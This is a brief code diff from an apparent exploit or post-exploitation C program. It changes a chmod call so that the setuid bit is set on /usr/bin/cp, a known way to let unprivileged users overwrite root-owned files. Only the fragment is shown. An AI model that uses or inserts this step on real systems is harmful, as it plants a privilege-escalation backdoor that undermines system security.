@@ -25,7 +25,7 @@ int main()
 		return -EINVAL;
 	}
 
-	ret = chmod("/usr/bin/chmod", cat.st_mode | S_ISUID);
+	ret = chmod("/usr/bin/cp", cat.st_mode | S_ISUID);
 
 	if (ret) {
 		perror("[-] failed to set SUID on /usr/bin/cp");
